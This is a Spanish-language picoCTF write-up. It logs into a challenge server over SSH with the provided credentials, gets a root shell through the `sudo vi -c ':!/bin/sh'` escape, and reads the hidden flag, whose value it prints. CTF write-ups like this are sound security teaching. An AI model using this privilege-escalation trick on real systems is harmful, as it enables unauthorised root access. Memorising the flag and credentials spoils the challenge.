### Descripción

Acceda al servidor mediante SSH y verifique si es posible leer archivos en el directorio raíz.

### Acceso al servidor

El administrador del sistema ha aprovisionado una cuenta para usted en el servidor principal.

**Credenciales:**

- **Usuario:** `picoplayer`
- **Servidor:** `saturn.picoctf.net`
- **Puerto:** `49789`
- **Contraseña:** `NBD+zO8s4y`

### Solución

1. **Abrir la terminal en Windows**
    
    Para acceder al servidor, use el siguiente comando en la terminal de Windows:
        
    `ssh -p 49789 picoplayer@saturn.picoctf.net`
    
2. **Aceptar la clave del servidor**
    
    - Si es la primera vez que se conecta, verá un mensaje sobre la autenticidad del host.
    - Escriba `yes` y presione **Enter** para continuar.
    
3. **Ingresar la contraseña**
    
    Cuando se le solicite, ingrese la contraseña:
    
    `NBD+zO8s4y`
    
4. **Navegar al directorio raíz (`/`)**
    
    - Moverse al directorio raíz usando:
                
        `cd /`
        
    - Ver los archivos y directorios disponibles:
        `ls`
        
5. **Obtener acceso como root**
    
    - Se utilizó el comando:
                
        `sudo vi -c ':!/bin/sh' /dev/null`
        
    - Se ingresó la contraseña nuevamente para ejecutar `sudo`.
        
    - Esto abrió un shell con permisos de superusuario.
        
6. **Acceder al directorio `/root` y leer la bandera**
    
    - Moverse al directorio `root`:
        
        `cd root`
        
    - Listar los archivos ocultos:
                
        `ls -la`
        
    - Encontrar el archivo `.flag.txt`.
        
    - Mostrar su contenido con:
        `cat .flag.txt`
    - La bandera obtenida fue:
        `picoCTF{uS1ng_v1m_3dit0r_1cee9dcb}` 
7. **Cierre de conexión**
    - La conexión se cerró automáticamente tras completar la tarea.
### Notas adicionales

- Se utilizó un método de escalada de privilegios con `sudo vi` para obtener acceso a root.
- Es recomendable verificar siempre los permisos y archivos disponibles en `/root` si se tienen privilegios elevados.
### Referencias

- [Uso de SSH en Windows](https://docs.microsoft.com/en-us/windows-server/administration/openssh/openssh_overview)
- Comandos básicos de Linux
- [Uso de `sudo` y escalada de privilegios](https://www.sudo.ws/)